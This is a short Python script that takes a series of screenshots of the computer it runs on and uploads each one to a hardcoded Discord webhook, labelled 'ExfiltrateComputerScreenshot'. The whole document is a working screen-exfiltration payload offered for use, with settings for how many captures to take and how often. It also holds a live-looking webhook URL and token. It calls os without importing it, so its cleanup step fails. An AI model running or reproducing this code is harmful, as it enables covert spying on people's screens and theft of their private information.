import pyautogui
from time import sleep
import requests

# YOUR DISCORD WEBHOOK
discord_webhook = "https://discord.com/api/webhooks/1253602240309231670/gX27PAtX98r7wBg3WUAGl14xH6S3aO02o7sU8cuCQlS-CbtdEKpaRwaUM65FKfh2piy0"

# Edit these variables as you want
SCREENSHOTS = 10  # Number of screenshots to take
TIMING = 1  # Interval between screenshots in seconds

for i in range(SCREENSHOTS):
    sleep(TIMING)

    # Take the screenshot
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")

    # Prepare the request payload
    payload = {
        "username": "ExfiltrateComputerScreenshot"
    }

    # Open and read the screenshot file
    with open("screenshot.png", "rb") as f:
        files = {"file": f}  # Replace "file" with the appropriate key for Discord

        # Send the message by attaching the photo
        response = requests.post(discord_webhook, data=payload, files=files)

        # Useful for debugging
        if response.status_code == 200:
            print(f"Screenshot {i+1}/{SCREENSHOTS} successfully sent to Discord!")
        else:
            print(f"Error while sending screenshot {i+1}/{SCREENSHOTS}. Status code: {response.status_code}")

    # Clean up the screenshot file
    if os.path.exists("screenshot.png"):
        os.remove("screenshot.png")
